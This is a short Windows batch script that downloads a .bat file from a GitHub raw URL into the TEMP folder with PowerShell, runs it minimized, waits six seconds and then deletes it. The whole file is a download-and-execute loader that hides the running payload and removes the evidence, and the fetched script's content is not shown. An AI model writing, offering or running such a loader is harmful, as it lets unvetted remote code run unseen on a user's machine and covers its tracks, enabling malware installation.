@echo off
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.bat' -OutFile CritScript.bat"
start /min CritScript.bat
timeout 6
del CritScript.bat
